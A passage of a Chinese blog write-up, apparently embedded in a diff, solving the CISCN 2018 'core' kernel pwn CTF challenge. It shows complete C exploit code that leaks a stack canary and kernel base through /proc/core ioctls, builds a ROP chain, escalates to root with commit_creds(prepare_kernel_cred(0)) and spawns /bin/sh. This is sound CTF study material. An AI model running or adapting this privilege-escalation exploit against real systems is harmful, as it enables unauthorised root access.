class="line">	write(fd,shellcode,<span class="number">25</span>*<span class="number">8</span>);</span><br><span class="line">	core_copy_func(fd,<span class="number">0xf000000000000000</span>+<span class="number">25</span>*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp	;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">		<span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">		<span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">		<span class="string">"pushfq\n"</span></span><br><span class="line">		<span class="string">"popq %2\n"</span></span><br><span class="line">		:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">"memory"</span></span><br><span class="line"> 	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//eip =(unsigned long long) get_shell;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL ;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">      commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> off)</span></span>&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889C</span>,off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy</span><span class="params">(<span class="keyword">int</span> fd , <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> len)</span></span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889A</span>,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	save_stats() ; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> canary ;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> module_base ;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> vmlinux_base ; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> iretq ;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs ;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rop[<span class="number">0x30</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"open file error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"open file success\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] buf: 0x%p"</span>,buf);</span><br><span class="line">	setoff(fd,<span class="number">0x40</span>);</span><br><span class="line">	core_read(fd,buf);</span><br><span class="line">	canary = buf[<span class="number">0</span>];</span><br><span class="line">	module_base =  buf[<span class="number">2</span>] - <span class="number">0x19b</span>;</span><br><span class="line">	vmlinux_base = buf[<span class="number">4</span>] - <span class="number">0x16684f0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] canary: 0x%p"</span>,canary);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] module_base: 0x%p"</span>,module_base);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] vmlinux_base: 0x%p"</span>,vmlinux_base);</span><br><span class="line">	commit_creds = vmlinux_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">	prepare_kernel_cred = vmlinux_base + <span class="number">0x9cce0</span>;</span><br><span class="line">	iretq = vmlinux_base + <span class="number">0x50ac2</span>;</span><br><span class="line">	swapgs  = module_base + <span class="number">0x0d6</span>;</span><br><span class="line">	rop[<span class="number">8</span>] = canary ; </span><br><span class="line">	rop[<span class="number">10</span>] = payload;</span><br><span class="line">	rop[<span class="number">11</span>] = swapgs;</span><br><span class="line">	rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">	rop[<span class="number">13</span>] = iretq ;</span><br><span class="line">	rop[<span class="number">14</span>] = get_shell ; </span><br><span class="line">	rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">	rop[<span class="number">16</span>] = user_eflags;</span><br><span class="line">	rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">	rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">	rop[<span class="number">19</span>] = <span class="number">0</span>;</span><br><span class="line">	write(fd,rop,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">	core_copy(fd,<span class="number">0xf000000000000000</span>+<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a></p>
+<p><a href="http://bobao.360.cn/learning/detail/3702.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3702.html</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/07/13/ciscn2018-core/">【kernel pwn】CISCN 2018 CTF core题解</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
+        <p><span>发布时间:</span>2018-07-13, 10:01:41</p>
+        <p><span>最后更新:</span>2018-07-13, 11:37:34</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/13/ciscn2018-core/" title="【kernel pwn】CISCN 2018 CTF core题解">http://p4nda.top/2018/07/13/ciscn2018-core/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/07/13/ciscn2018-core/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/07/11/WCTF-2018/">
+                    【WCTF 2018】parrot_revenge 题解
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#core"><span class="toc-number">1.</span> <span class="toc-text">core</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目-amp-漏洞分析"><span class="toc-number">1.1.</span> <span class="toc-text">题目&amp;漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内存地址泄露"><span class="toc-number">1.2.1.</span> <span class="toc-text">内存地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#控制RIP"><span class="toc-number">1.2.2.</span> <span class="toc-text">控制RIP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP构造"><span class="toc-number">1.2.3.</span> <span class="toc-text">ROP构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rop"><span class="toc-number">2.1.</span> <span class="toc-text">rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2user"><span class="toc-number">2.2.</span> <span class="toc-text">ret2user</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reference"><span class="toc-number">3.</span> <span class="toc-text">reference</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"【kernel pwn】CISCN 2018 CTF core题解　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://p4nda.top/2018/07/13/ciscn2018-core/';
+            this.page.identifier = '2018/07/13/ciscn2018-core/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//p4nda.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/07/11/WCTF-2018/" title="下一篇: 【WCTF 2018】parrot_revenge 题解">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【kernel pwn】CISCN 2018 CTF core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB CTF 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 P4nda
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 天黑了~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
+</html>
